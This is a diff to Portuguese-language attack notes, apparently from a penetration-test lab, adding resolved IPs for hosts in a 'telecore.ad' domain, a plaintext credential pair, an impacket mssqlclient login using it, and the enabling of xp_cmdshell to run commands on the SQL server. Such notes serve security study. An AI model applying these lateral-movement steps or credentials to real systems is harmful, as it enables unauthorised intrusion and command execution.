@@ -69,3 +69,27 @@ pegando o IP destas máquinas -->
 #+begin_src sh
 for ip in $(cat computers.txt);do ping -c 1 $ip;done | grep PING | awk '{print $2 " -- " $3}' | tr "()" " "
 #+end_src
+
+resultado -->
+#+begin_src sh
+DC01.telecore.ad --  10.5.2.2
+PKI-Srv.telecore.ad --  10.5.2.8
+SQL-Srv.telecore.ad --  10.5.2.22
+Ex-Srv.telecore.ad --  10.5.2.16
+esxi-vd.telecore.ad --  10.5.2.111
+#+end_src
+
+credenciais -->
+#+begin_src text
+tel_support01:#T3l3phon3!
+#+end_src
+
+com essas credenciais é possível acessar o SQL-Srv.telecored.ad, o impacket possui um script client -->
+#+begin_src sh
+mssqlclient.py tel_support01:'#T3l3phon3!'@10.5.2.22 -debug -windows-auth
+#+end_src
+
+o SQL server possui uma opção chamada *xp_cmdshell*, que permite executar comandos via cmd -->
+#+begin_src sh
+SQL (TELECORE\tel_support01  dbo@master)> enable_xp_cmdshell
+#+end_src
